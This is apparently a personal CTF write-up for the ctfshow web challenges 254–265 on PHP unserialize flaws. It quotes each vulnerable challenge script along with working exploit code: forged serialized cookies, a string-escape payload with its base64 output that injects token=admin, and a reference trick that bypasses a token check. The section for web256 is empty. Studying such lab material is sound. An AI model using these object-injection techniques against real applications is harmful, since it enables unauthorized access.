ctfshow 解题
==

when you tired and suspect yourself , you actually have every right to say fuck you to the world , but do not stop , never.

web 254
-
```php
error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
} 
```
payload:/?username=xxxxxx&password=xxxxxx

it just show you how serialize work....if the username and password can through the check , you can get flag.

web 255
-

```php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}


payload
<?php
        class ctfShowUser{
    public $isVip=true;
}
  $s=urlencode(serialize(new ctfShowUser()));
  echo $s;

```
just put the result on the cookie part

web256
-
```php



```




web 262
-
```php
error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);


message.php  (hint)
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
exp:
<?php
class message{
   public $from;
   public $msg;
   public $to;
   public $token='user';
   public function __construct($f,$m,$t){
       $this->from = $f;
       $this->msg = $m;
       $this->to = $t;
   }
}
$f = 1;
$m = 1;
$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}';
$msg = new message($f,$m,$t);
$umsg = str_replace('fuck', 'loveU', serialize($msg));
echo $umsg ;
echo "\n";
echo base64_encode($umsg);

O:7:"message":4:{s:4:"from";i:1;s:3:"msg";i:1;s:2:"to";s:135:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:5:"token";s:5:"admin";}";s:5:"token";s:4:"user";}
Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO2k6MTtzOjM6Im1zZyI7aToxO3M6MjoidG8iO3M6MTM1OiJsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVUiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6NToidG9rZW4iO3M6NDoidXNlciI7fQ==
```
考点：反序列化字符串逃逸，字符串逃逸我会总结在另一个位置
打完后访问message.php就OK了




web264
-
```php
error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);
session_start();
highlight_file(__FILE__);
include('flag.php');

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_SESSION['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```
和web262里面的payload的一样只不过多设了个cookie
it have no diffierent to web 262,dont forget set up a cookie.




web265
-
```php

error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}

exp
<?php
class ctfshowAdmin{
    public $token;
    public $password;
    public function __construct(){
        $this->token='a';
        $this->password =&$this->token;
}
$a=new ctfshowAdmin();
echo serialize($a);

```
考点php地址传参

这个考点在红明谷2021的writeshell中也遇到了